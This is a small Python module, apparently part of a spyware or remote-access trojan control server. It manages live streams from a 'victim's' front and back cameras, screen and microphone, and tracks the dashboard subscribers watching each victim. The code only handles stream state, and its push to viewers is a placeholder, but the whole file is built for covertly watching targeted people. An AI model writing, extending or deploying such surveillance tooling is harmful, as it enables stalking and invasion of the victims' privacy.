import threading
import time
import json
from collections import defaultdict

class StreamMultiplexer:
    """
    Manages the state of live streams for a specific victim.
    Ensures only one 'High-Quality' stream is active per victim to save bandwidth.
    """
    def __init__(self):
        self._lock = threading.Lock()
        # {victim_id: {stream_type: status}}
        # status: 'active', 'thumbnail', 'paused'
        self.stream_states = defaultdict(lambda: {'front': 'paused', 'back': 'paused', 'screen': 'paused', 'mic': 'paused'})
        self.active_subscribers = defaultdict(set) # {victim_id: set of subscriber_ids}

    def set_stream_state(self, victim_id, stream_type, state):
        """
        Manually set a stream state.
        If a stream is set to 'active', all others for that victim are downgraded to 'thumbnail'.
        """
        with self._lock:
            # If activating, downgrade others
            if state == 'active':
                for st in self.stream_states[victim_id]:
                    if st != stream_type:
                        self.stream_states[victim_id][st] = 'thumbnail'
            self.stream_states[victim_id][stream_type] = state
            print(f"[MUX] {victim_id} | {stream_type} -> {state}")
            self._notify_subscribers(victim_id)

    def get_stream_state(self, victim_id, stream_type):
        with self._lock:
            return self.stream_states[victim_id].get(stream_type, 'paused')

    def get_all_states(self, victim_id):
        with self._lock:
            return dict(self.stream_states[victim_id])

    def subscribe(self, victim_id, subscriber_id):
        with self._lock:
            self.active_subscribers[victim_id].add(subscriber_id)

    def unsubscribe(self, victim_id, subscriber_id):
        with self._lock:
            self.active_subscribers[victim_id].discard(subscriber_id)

    def _notify_subscribers(self, victim_id):
        """
        In a full implementation, this would push a WebSocket message 
        to all connected dashboard clients for this victim.
        """
        # Placeholder for real-time WS push
        pass

# Global Instance
MUX = StreamMultiplexer()
